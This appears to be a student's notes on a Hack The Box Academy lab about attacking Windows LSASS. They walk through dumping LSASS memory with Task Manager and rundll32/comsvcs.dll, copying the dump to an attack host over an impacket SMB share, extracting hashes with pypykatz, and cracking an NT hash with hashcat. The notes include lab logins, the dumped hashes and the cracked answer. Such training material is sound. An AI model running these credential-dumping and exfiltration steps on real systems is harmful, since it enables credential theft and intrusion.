
Reference the lessons on LSASS in [[Credential Storage#LSASS]] 




### Dumping LSASS Process Memory

>[! Note ] 
>Best to create a copy of the contents of LSASS process memory via a memory dump. This allows to extract credentials offline 

#### Task Manager Method:

`Open Task Manager` > `Select the Processes tab` > `Find & right click the Local Security Authority Process` > `Select Create dump file`

- The above creates a file called `lsass.DMP` and is located in:
```cmd-session
C:\Users\loggedonusersdirectory\AppData\Local\Temp
```
- Transfer `lsass.DMP` to the attack host via [[Attacking SAM#Syntax for smbserver.py]]


#### Rundll32.exe & Comsvcs.dll Method:

>[! Warning] Warning about this dumping method:
> Modern anti-virus will flag this action as malicious!

1) Determine the process ID assigned to lsass.exe in cmd or powershell

##### Find LSASS PID via CMD
```cmd
tasklist /svc
```

##### Find LSASS PID via Powershell
```powershell
Get-Process lsass
```

#### Creating lsass.dmp via Powershell

>[! Hint]
> Be sure to run powershell as admin

```powershell
PS C:\Windows\system32> rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
```
	- rundll32.exe calls cmsvcs.dll 
	- which then calls MiniDump to dump LSASS process memory to the intended directory


### Extract Credentials via Pypykatz:
> [! Hint]
> [pypykatz](https://github.com/skelsec/pypykatz) is a python implementation of Mimikatz, allowing us to run it on Linux attack hosts

> [! Hint]
> Recall that LSASS stores credentials that have active logon sessions on Windows systems. When we dumped LSASS process memory into the file, we essentially took a "snapshot" of what was in memory at that point in time. If there were any active logon sessions, the credentials used to establish them will be present.

##### Running Pypykatz
```python
pypykatz lsa minidump /home/of/attack/host/Documents/lsass.dmp
```


This will result in subsection output for MSV, WDIGSET, Kerberos, DPAPI

MSV
- This is an authentication package that LSA calls to validate logon attempts against the SAM database.

WDIGEST
- Older authentication protocol enabled by default in Windows XP - Windows 8 and Windows Server 2003 -2012
- LSASS caches WDIGEST credentials in clear-text
- Microsoft patched this WDIGEST vulnerability and it is also disabled by default

Kerberos
- LSASS `caches passwords`, `ekeys`, `tickets`, and `pins` associated with Kerberos. 
- It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

DPAPI
- A set of APIs in Windows used to encrypt and decrypt DPAPI data blobs
- Mimikatz and Pypykatz can extract the DPAPI masterkey for logged-on users when their data is present in the LSASS process memory.
- The masterkey decrypts the secrets associated with the applications that use DPAPI below:

| Applications                | DPAPI Usage                                                                                 |
| --------------------------- | ------------------------------------------------------------------------------------------- |
| `Internet Explorer`         | Password form auto-completion data (username and password for saved sites).                 |
| `Google Chrome`             | Password form auto-completion data (username and password for saved sites).                 |
| `Outlook`                   | Passwords for email accounts.                                                               |
| `Remote Desktop Connection` | Saved credentials for connections to remote machines.                                       |
| `Credential Manager`        | Saved credentials for accessing shared resources, joining Wireless networks, VPNs and more. |

> [! Note ] One user found
> In the example, only one user was found ,`Bob`, so no need to create a text file of hashes
>> ```go
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt

## Questions

Username:
```go
htb-student
```

Password:
```go
HTB_@cademy_stdnt!
```

RDP:
```go
xfreerdp /v:10.129.224.38 /u:htb-student /p:HTB_@cademy_stdnt! /cert:ignore
```

1) What is the name of the executable file associated with the Local Security Authority Process?
```go
lsass.exe
```

2) Apply the concepts taught in this section to obtain the password to the Vendor user account on the target. Submit the clear-text password as the answer. (Format: Case sensitive)
```go
```

Create a share to connect back to your attack host and specify where to store the dump file:
```go
sudo impacket-smbserver -smb2support Attacking_LSASS ~/Documents
```

>[! Hint ]
>Reference [[Attacking SAM#Syntax for smbserver.py]] to move dump file to attack host share

RDP into the machine with the above xfreerdp command and create the dump file, `lsass.DMP`
![[Pasted image 20250508175203.png]]

On the windows machine, move the lsass.DMP file to the attack host share 
```go
move lsass.DMP \\AttackHostIP\Attacking_LSASS
```


Scroll down and you will see a LogonSession for the user  `Vendor`.
```go
== LogonSession ==
authentication_id 124843 (1e7ab)
session_id 0
username Vendor
domainname FS01
logon_server FS01
logon_time 2025-05-08T22:59:17.942120+00:00
sid S-1-5-21-2288469977-2371064354-2971934342-1003
luid 124843
        == MSV ==
                Username: Vendor
                Domain: FS01
                LM: NA
                NT: 31f87811133bc6aaa75a536e77f64314
                SHA1: 2b1c560c35923a8936263770a047764d0422caba
                DPAPI: 0000000000000000000000000000000000000000
        == WDIGEST [1e7ab]==
                username Vendor
                domainname FS01
                password None
                password (hex)
        == Kerberos ==
                Username: Vendor
                Domain: FS01
        == WDIGEST [1e7ab]==
                username Vendor
                domainname FS01
                password None
                password (hex)

```

Crack the NT hash
```go
hashcat -m 1000 31f87811133bc6aaa75a536e77f64314 /usr/share/wordlists/rockyou.txt --show

31f87811133bc6aaa75a536e77f64314:Mic@123
```


